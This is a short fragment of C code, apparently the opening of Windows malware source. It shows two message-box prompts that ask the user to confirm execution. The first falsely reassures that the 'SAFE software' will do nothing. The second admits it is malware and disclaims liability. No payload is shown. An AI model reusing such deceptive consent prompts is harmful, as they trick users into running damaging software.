...
void start() {
	...
	if (argc > 1) {
		...
		if (MessageBoxA(NULL, "This is SAFE software.\r\n\
This might make you feel weird or scared. Don't worry!\r\n\
If you are seeing this message, simply press YES! and nothing will happen.\r\n\
If you know what does, \
press YES as well.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS SAFE PROGRAM?", "SWAG", MB_YESNO | MB_ICONWARNING) != IDYES ||
MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", "SWAG", MB_YESNO | MB_ICONWARNING) != IDYES) {
			ExitProcess(0);
		}
